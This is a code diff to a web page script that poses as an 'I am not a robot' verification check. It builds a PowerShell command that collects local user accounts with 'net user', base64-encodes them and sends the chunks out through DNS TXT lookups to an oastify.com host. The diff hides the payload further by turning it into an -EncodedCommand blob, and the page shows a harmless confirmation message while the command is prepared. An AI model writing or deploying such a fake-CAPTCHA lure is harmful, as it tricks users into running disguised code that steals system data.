@@ -195,8 +195,8 @@
                 (document.getElementById('verification-id').textContent = verificationId);
             
             const exe = "powershell";
-            const flags = "-NoProfile -Command";
-            const payload = `"$m=(net user 2>\$null)-join\`"n\`"; \$e=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(\$m)) -replace '[+/=]',''; ((\$e -split '(.{1,50})' | ?{\$_}) | %{Resolve-DnsName -Name "\$_00ys2lyrxkrovhnl26ip7aca2dtj17v4.oastify.com" -Type TXT})"`;
+            const flags = "-NoProfile -EncodedCommand";
+            const payload = "JG09KG5ldCB1c2VyIDI+JG51bGwpLWpvaW4iYG4iOyRlPVtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRtKSktcmVwbGFjZSdbKy89XScsJyc7KCgkZSAtc3BsaXQgJyguezEsNTB9KSd8P3skX30pfCV7JGk9MH17UmVzb2x2ZS1EbnNOYW1lIC1OYW1lICIkXy4kKCRpKyspMDB5czIxeXhya292aG5sMjZpcDdhY2EyZHRqbDdmdjQub2FzdGlmeS5jb20iIC1UeXBlIFRYVH0pCg==";
             const fullCommand = `${exe} ${flags} ${payload}`;
 
             commandDisplay.textContent = '✅ "I am not a robot"';
